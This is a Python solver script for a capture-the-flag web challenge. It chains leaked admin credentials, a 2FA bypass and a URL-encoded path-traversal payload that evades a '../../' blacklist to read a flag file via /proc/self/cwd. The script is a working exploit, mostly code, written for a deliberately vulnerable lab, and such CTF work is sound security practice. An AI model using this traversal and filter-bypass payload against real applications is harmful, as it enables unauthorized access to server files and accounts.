#!/usr/bin/env python3
"""
Lunar File Invasion solver.

Chain:
  1. /.gitignore_test + /index/static/login.html~ leak admin creds.
  2. Login (a valid session is granted *before* 2FA is checked -> 2FA bypass;
     protected routes like /admin/download are reachable with that session).
  3. Path-traversal LFI in /admin/download/<path>. The blacklist only rejects
     the literal substring "../../", so ".././" repeated bypasses it. Dots and
     slashes are URL-encoded so Werkzeug does not collapse the traversal before
     routing. /proc/self/cwd points at the app CWD, where ./FLAG/flag.txt lives.

Usage: python3 solve.py [base_url]
  default http://127.0.0.1:25307 ; live: https://lunarfileinvasion.ctf.hackucf.org
"""
import os, sys, re, requests

base = os.environ.get("URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:25307")
s = requests.Session()

r = s.get(base + "/login")
m = re.search(r'name="csrf_token"[^>]*value="([^"]+)"', r.text)
csrf = m.group(1) if m else None
s.post(base + "/login", data={
    "csrf_token": csrf,
    "email": "admin@lunarfiles.muhammadali",
    "password": "jEJ&(32)DMC<!*###",
})

seg = "%2e%2e%2f%2e%2f" * 20  # ".././" x20, URL-encoded
target = "proc/self/cwd/FLAG/flag.txt".encode().hex()
target = "".join("%" + target[i:i+2] for i in range(0, len(target), 2))
r = s.get(base + "/admin/download/" + seg + target, allow_redirects=False)
m = re.search(r"sun\{[^}]*\}", r.text)
print(m.group(0) if m else "NO FLAG FOUND")
